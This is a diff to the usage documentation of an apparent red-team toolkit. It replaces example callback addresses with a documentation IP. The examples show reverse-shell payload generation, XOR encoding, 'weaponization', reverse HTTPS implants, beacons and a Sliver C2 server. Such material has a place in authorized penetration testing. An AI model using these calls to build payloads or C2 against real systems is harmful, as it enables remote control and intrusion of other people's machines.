@@ -122,7 +122,7 @@ config = PayloadConfig(
     format=PayloadFormat.EXE,
     architecture=Architecture.X64,
     platform=Platform.WINDOWS,
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444
 )
 
@@ -130,7 +130,7 @@ result = gen.generate(config)
 
 # Multi-platform generation
 platforms = [Platform.WINDOWS, Platform.LINUX, Platform.ANDROID]
-results = gen.generate_multi_platform('multi', '192.168.1.100', 4444, platforms)
+results = gen.generate_multi_platform('multi', '192.0.2.100', 4444, platforms)
 ```
 
 ### Payload Encoder
@@ -197,7 +197,7 @@ engine = WeaponizationEngine()
 # Quick weaponize
 report = engine.quick_weaponize(
     name='my_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=4444,
     platform=Platform.WINDOWS
 )
@@ -205,7 +205,7 @@ report = engine.quick_weaponize(
 # Custom job
 job = engine.create_job(
     name='advanced_payload',
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=8443,
     platform=Platform.WINDOWS,
     encode=True,
@@ -236,7 +236,7 @@ success, message = client.generate_implant(
     name='reverse_https',
     implant_type=ImplantType.REVERSE_HTTPS,
     protocol=Protocol.HTTPS,
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=443
 )
 
@@ -245,7 +245,7 @@ success, message = client.generate_beacon(
     name='beacon_1',
     interval=60,
     jitter=30,
-    lhost='192.168.1.100',
+    lhost='192.0.2.100',
     lport=443
 )
 
@@ -312,7 +312,7 @@ sliver_server = C2Server(
     id='sliver_1',
     name='Primary Sliver',
     framework=C2FrameworkType.SLIVER,
-    host='192.168.1.100',
+    host='192.0.2.100',
     port=31337,
     status=C2Status.ONLINE
 )
@@ -442,7 +442,7 @@ auditor.log_action(
     action='execute_command',
     resource='agent_123',
     result='success',
-    ip_address='192.168.1.1'
+    ip_address='192.0.2.1'
 )
 
 # Search audit log
@@ -481,7 +481,7 @@ python3 authorization.py --authorize sql_injection --pin 1234
 ### Weaponization
 ```bash
 # Payload generation
-python3 payload_generator.py --lhost 192.168.1.100 --lport 4444
+python3 payload_generator.py --lhost 192.0.2.100 --lport 4444
 
 # Encoding
 python3 encoder.py --encode payload.exe --encoder xor_dynamic
@@ -490,7 +490,7 @@ python3 encoder.py --encode payload.exe --encoder xor_dynamic
 python3 testing_framework.py --test payload.exe
 
 # Full weaponization
-python3 weaponization_engine.py --quick --lhost 192.168.1.100
+python3 weaponization_engine.py --quick --lhost 192.0.2.100
 ```
 
 ### C2
